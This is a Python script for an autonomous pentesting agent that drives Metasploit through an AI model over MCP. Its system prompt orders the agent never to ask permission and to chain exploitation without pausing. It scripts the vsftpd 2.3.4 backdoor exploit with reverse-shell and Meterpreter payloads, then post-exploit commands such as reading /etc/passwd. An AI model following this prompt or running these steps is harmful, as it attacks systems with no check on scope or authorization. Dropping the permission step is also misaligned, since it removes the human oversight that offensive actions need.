"""
Pentester Agent — LangChain + MetasploitMCP
============================================
Improved version with:
  - Direct MultiServerMCPClient usage (langchain-mcp-adapters 0.1.0 compatible)
  - SSE timeout config to prevent CancelledError on long exploits
  - Per-run asyncio timeout guard
  - Persistent history across interactive turns
  - Clean error handling

Prerequisites
-------------
    pip install langchain langgraph langchain-anthropic \
                langchain-mcp-adapters mcp rich python-dotenv

Environment (.env)
------------------
    ANTHROPIC_API_KEY=sk-...
    MSF_MCP_URL=http://127.0.0.1:8085/sse
    MSF_LHOST=192.168.100.50
    RUN_TIMEOUT=300
    SSE_TIMEOUT=120
"""

import asyncio
import json
import os
import sys
import warnings
from datetime import datetime
from typing import Any

# Silence LangGraph v1 deprecation noise
warnings.filterwarnings("ignore", category=DeprecationWarning, module="langgraph")

from dotenv import load_dotenv
load_dotenv()

from langchain_anthropic import ChatAnthropic
from langchain_core.messages import HumanMessage, SystemMessage
from langchain_mcp_adapters.client import MultiServerMCPClient
from langgraph.prebuilt import create_react_agent
from rich import box
from rich.columns import Columns
from rich.console import Console
from rich.markdown import Markdown
from rich.panel import Panel
from rich.prompt import Prompt
from rich.rule import Rule
from rich.table import Table
from rich.text import Text
from rich.theme import Theme

# ── Console ───────────────────────────────────────────────────────────────────

THEME = Theme({
    "banner":      "bold red",
    "section":     "bold yellow",
    "tool.name":   "cyan",
    "tool.args":   "dim white",
    "tool.result": "green",
    "tool.warn":   "yellow",
    "tool.error":  "bold red",
    "ai":          "white",
    "human":       "bold magenta",
    "label":       "dim white",
    "success":     "bold green",
    "info":        "bold blue",
    "muted":       "dim",
})

console = Console(theme=THEME, highlight=False)

# ── Config ─────────────────────────────────────────────────────────────────────

MSF_MCP_URL: str = os.getenv("MSF_MCP_URL", "http://127.0.0.1:8085/sse")
LHOST:        str = os.getenv("MSF_LHOST",  "192.168.100.50")
LPORT:        str = os.getenv("MSF_LPORT",  "4444")
MODEL:        str = os.getenv("MODEL",       "claude-haiku-4-5")
RUN_TIMEOUT:  int = int(os.getenv("RUN_TIMEOUT", "300"))
SSE_TIMEOUT:  int = int(os.getenv("SSE_TIMEOUT",  "120"))

SYSTEM_PROMPT = f"""You are an autonomous penetration testing agent in a fully authorized lab environment.

NETWORK CONTEXT
---------------
Attacker IP (your machine) : {LHOST}
Default LPORT              : {LPORT}

EXECUTION RULES
---------------
1. Call tools FIRST — never preface with "I will now..."
2. Never ask for information already given.
3. Never ask for permission — everything is pre-authorized.
4. If a step fails, diagnose and retry without asking.
5. Chain all steps (recon -> exploit -> post) without stopping.
6. CRITICAL: Send session commands ONE AT A TIME. Always wait for the result
   of each send_session_command before sending the next one. Never batch them.

vsftpd_234_backdoor EXPLOIT RULES  (memorize — no exceptions)
--------------------------------------------------------------
The MetasploitMCP wrapper for vsftpd_234_backdoor REQUIRES LHOST even though
it is a bind-shell. Always call run_exploit with ALL THREE options:
  RHOSTS : <target_ip>
  LHOST  : {LHOST}
  LPORT  : {LPORT}

Do NOT omit LHOST — it will fail validation on the first attempt if you do.
Do NOT start a separate listener — the module handles it automatically.

After exploit fires and session opens:
  1. Call list_active_sessions to confirm session ID.
  2. Send commands ONE BY ONE — never in parallel:
       Step A: send_session_command(id)           → wait for result
       Step B: send_session_command(whoami)        → wait for result
       Step C: send_session_command(uname -a)      → wait for result
       Step D: send_session_command(cat /etc/passwd) → wait for result
  3. If a Meterpreter command fails with "Unknown command", first send:
       send_session_command(shell)   → wait for "Channel created"
     Then retry the command.

REVERSE-SHELL EXPLOITS (non-vsftpd)
------------------------------------
Linux x86  -> payload: cmd/unix/reverse  or  linux/x86/shell/reverse_tcp
Linux x64  -> payload: linux/x64/shell/reverse_tcp
Windows    -> payload: windows/x64/meterpreter/reverse_tcp

Always set LHOST={LHOST} + LPORT={LPORT}. Start listener first with start_listener.

AUTONOMOUS WORKFLOW
-------------------
Given target + module, run WITHOUT pausing:

  1. run_exploit (with RHOSTS + LHOST + LPORT)
  2. list_active_sessions
  3. If session — send commands sequentially, one at a time:
       a. send_session_command -> id
       b. send_session_command -> whoami
       c. send_session_command -> uname -a
       d. send_session_command -> cat /etc/passwd
  4. Print final report table

REPORT FORMAT (always end with this)
-------------------------------------
| Target | Port | Service | Module | Result | SessionID |
|--------|------|---------|--------|--------|-----------|
| x.x.x.x | 21 | vsftpd | unix/ftp/vsftpd_234_backdoor | SUCCESS | 1 |
"""

# ── LLM & Agent ───────────────────────────────────────────────────────────────

def build_llm() -> ChatAnthropic:
    return ChatAnthropic(
        model=MODEL,
        temperature=0,
        max_tokens=4096,
    )


def build_agent(tools: list):
    llm = build_llm()
    return create_react_agent(
        llm,
        tools,
        prompt=SystemMessage(content=SYSTEM_PROMPT),
    )

# ── Rendering ─────────────────────────────────────────────────────────────────

def print_banner():
    banner = Text()
    for line in [
        "███╗   ███╗███████╗███████╗\n",
        "████╗ ████║██╔════╝██╔════╝\n",
        "██╔████╔██║███████╗█████╗  \n",
        "██║╚██╔╝██║╚════██║██╔══╝  \n",
        "██║ ╚═╝ ██║███████║██║     \n",
        "╚═╝     ╚═╝╚══════╝╚═╝     ",
    ]:
        banner.append(line, style="bold red")

    meta = Text()
    meta.append("MetasploitMCP", style="bold yellow")
    meta.append(" Pentester Agent\n", style="white")
    meta.append("LangChain + LangGraph + Anthropic\n\n", style="dim")
    for label, value in [
        ("MCP Server", MSF_MCP_URL),
        ("LHOST     ", LHOST),
        ("Model     ", MODEL),
        ("Time      ", datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
    ]:
        meta.append(f"{label}: ", style="dim")
        meta.append(value + "\n", style="cyan")

    console.print()
    console.print(Panel(
        Columns([banner, meta], padding=(0, 4)),
        border_style="red",
        padding=(1, 2),
    ))
    console.print()


def print_tools_table(tools: list):
    table = Table(
        title="[bold yellow]Loaded MCP Tools[/]",
        box=box.SIMPLE_HEAVY,
        border_style="dim",
        title_justify="left",
        header_style="bold cyan",
    )
    table.add_column("#",           style="dim",       width=4)
    table.add_column("Tool Name",   style="cyan")
    table.add_column("Description", style="dim white")

    for i, t in enumerate(tools, 1):
        desc = (getattr(t, "description", "") or "")
        short = desc[:72] + ("..." if len(desc) > 72 else "")
        table.add_row(str(i), t.name, short)

    console.print(table)
    console.print()


def _status_icon(status: str) -> tuple[str, str]:
    s = status.lower()
    if s in ("success", "ok"):   return "✔", "green"
    if s in ("warning", "warn"): return "⚠", "yellow"
    if s in ("error", "fail"):   return "✘", "bold red"
    return "●", "blue"


def render_tool_call(name: str, args: dict):
    body = Text()
    for k, v in args.items():
        body.append(f"  {k}: ", style="dim")
        body.append(str(v) + "\n", style="white")
    console.print(Panel(
        body,
        title=f"[bold cyan]⚙ TOOL CALL[/]  [cyan]{name}[/]",
        border_style="cyan",
        padding=(0, 1),
    ))


def render_tool_result(content: str):
    try:
        data = json.loads(content)
        if isinstance(data, list):
            texts = [b["text"] for b in data
                     if isinstance(b, dict) and b.get("type") == "text"]
            data = json.loads(texts[0]) if texts else None
    except (json.JSONDecodeError, TypeError, IndexError, KeyError):
        data = None

    if isinstance(data, dict):
        status  = data.get("status", "")
        icon, style = _status_icon(status)
        message = data.get("message", "")

        body = Text()
        if status:
            body.append(f"{icon} {status.upper()}\n", style=f"bold {style}")
        if message:
            body.append(f"{message}\n\n", style="white")
        for k, v in data.items():
            if k in ("status", "message"):
                continue
            body.append(f"{k}: ", style="dim")
            body.append(
                f"{json.dumps(v) if isinstance(v, (dict, list)) else str(v)}\n",
                style="white",
            )
        border = style if style != "bold red" else "red"
        console.print(Panel(body,
                            title=f"[{style}]◀ TOOL RESULT[/]",
                            border_style=border,
                            padding=(0, 1)))
    else:
        console.print(Panel(
            Text(str(content), style="white"),
            title="[green]◀ TOOL RESULT[/]",
            border_style="green",
            padding=(0, 1),
        ))


def render_ai_message(text: str):
    console.print(Panel(
        Markdown(text),
        title="[bold white]🤖 AGENT[/]",
        border_style="white",
        padding=(0, 1),
    ))


def render_human_message(text: str):
    console.print(Panel(
        Text(text, style="bold magenta"),
        title="[bold magenta]▶ OBJECTIVE[/]",
        border_style="magenta",
        padding=(0, 1),
    ))


def print_section(title: str):
    console.print(Rule(f"[bold yellow]{title}[/]", style="yellow"))


def _print_message(msg: Any) -> None:
    kind = type(msg).__name__

    if kind == "HumanMessage" or getattr(msg, "type", "") == "human":
        return

    if kind == "ToolMessage":
        if hasattr(msg, "content") and msg.content:
            render_tool_result(msg.content)
        return

    if hasattr(msg, "tool_calls") and msg.tool_calls:
        for tc in msg.tool_calls:
            render_tool_call(tc["name"], tc.get("args", {}))

    if hasattr(msg, "content") and msg.content:
        if isinstance(msg.content, str) and msg.content.strip():
            render_ai_message(msg.content)
        elif isinstance(msg.content, list):
            texts = [
                b["text"] for b in msg.content
                if isinstance(b, dict)
                and b.get("type") == "text"
                and b.get("text", "").strip()
            ]
            if texts:
                render_ai_message("\n".join(texts))

# ── Runner ─────────────────────────────────────────────────────────────────────

async def run_pentest(objective: str, agent, history: list) -> list:
    """
    Stream one pentest run.
    Returns the updated message history for context persistence across turns.
    """
    print_section("STARTING PENTEST")
    render_human_message(objective)
    console.print()

    history = list(history)
    history.append(HumanMessage(content=objective))
    final_messages = history[:]

    async def _stream():
        nonlocal final_messages
        async for chunk in agent.astream(
            {"messages": history},
            stream_mode="values",
        ):
            final_messages = chunk["messages"]
            yield chunk["messages"][-1]

    with console.status("[bold yellow]Agent thinking…[/]", spinner="dots") as status:
        try:
            async with asyncio.timeout(RUN_TIMEOUT):
                async for last_msg in _stream():
                    if type(last_msg).__name__ == "ToolMessage":
                        status.update("[bold green]Processing tool result…[/]")
                    elif hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
                        tc_name = last_msg.tool_calls[0]["name"]
                        status.update(f"[bold cyan]Calling {tc_name}…[/]")
                    else:
                        status.update("[bold yellow]Agent reasoning…[/]")

                    status.stop()
                    _print_message(last_msg)
                    console.print()
                    status.start()

        except asyncio.TimeoutError:
            console.print(Panel(
                Text(f"Run exceeded {RUN_TIMEOUT}s — partial results shown above.",
                     style="bold yellow"),
                title="[yellow]TIMEOUT[/]",
                border_style="yellow",
            ))

    print_section("RUN COMPLETE")
    return final_messages

# ── Interactive REPL ───────────────────────────────────────────────────────────

HELP_TEXT = """
[bold yellow]Commands:[/]
  [cyan]help[/]        Show this help
  [cyan]tools[/]       List loaded MCP tools
  [cyan]new[/]         Clear conversation history
  [cyan]clear[/]       Clear the screen
  [cyan]exit/quit[/]   Exit

[bold yellow]Examples:[/]
  [dim]exploit vsftpd 2.3.4 on 192.168.100.32[/]
  [dim]scan 192.168.100.32 for open ports[/]
  [dim]run auxiliary/scanner/ftp/ftp_version on 192.168.100.32[/]
"""


async def interactive_mode(tools: list, agent) -> None:
    print_section("INTERACTIVE MODE")
    console.print("[dim]Type [cyan]help[/] for commands, [cyan]new[/] to reset history.[/]\n")

    history: list = []

    while True:
        try:
            objective = Prompt.ask(
                Text.assemble(("msf-agent", "bold red"), (" > ", "yellow"))
            ).strip()
        except (EOFError, KeyboardInterrupt):
            console.print("\n[dim]Interrupted. Exiting.[/]")
            break

        if not objective:
            continue

        cmd = objective.lower()

        if cmd in ("exit", "quit", "q"):
            console.print("[dim]Goodbye.[/]")
            break
        elif cmd == "help":
            console.print(HELP_TEXT)
        elif cmd == "tools":
            print_tools_table(tools)
        elif cmd == "clear":
            console.clear()
            print_banner()
        elif cmd == "new":
            history = []
            console.print("[dim]History cleared — starting fresh.[/]\n")
        else:
            console.print()
            try:
                history = await run_pentest(objective, agent, history)
            except Exception as exc:
                console.print(Panel(
                    Text(f"{type(exc).__name__}: {exc}", style="bold red"),
                    title="[bold red]ERROR[/]",
                    border_style="red",
                ))
            console.print()

# ── Entry point ────────────────────────────────────────────────────────────────

async def main() -> None:
    print_banner()

    mcp_config = {
        "metasploit": {
            "url": MSF_MCP_URL,
            "transport": "sse",
            "sse_read_timeout": SSE_TIMEOUT,
            "timeout": SSE_TIMEOUT,
        }
    }

    console.print(f"[dim]Connecting to MetasploitMCP at [cyan]{MSF_MCP_URL}[/]…[/]")

    try:
        # langchain-mcp-adapters 0.1.0: direct usage, no context manager
        client = MultiServerMCPClient(mcp_config)
        tools  = await client.get_tools()
    except Exception as exc:
        console.print(Panel(
            Text(
                f"Failed to connect to MetasploitMCP:\n"
                f"{type(exc).__name__}: {exc}\n\n"
                f"Make sure MetasploitMCP is running at {MSF_MCP_URL}",
                style="bold red",
            ),
            title="[bold red]CONNECTION ERROR[/]",
            border_style="red",
        ))
        raise SystemExit(1)

    if not tools:
        console.print("[bold red]No tools loaded — is MetasploitMCP running?[/]")
        raise SystemExit(1)

    agent = build_agent(tools)
    console.print(f"[success]✔ Connected — {len(tools)} tools loaded[/]\n")
    print_tools_table(tools)

    if len(sys.argv) >= 2:
        objective = " ".join(sys.argv[1:])
        await run_pentest(objective, agent, [])
    else:
        await interactive_mode(tools, agent)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[dim]Bye.[/]")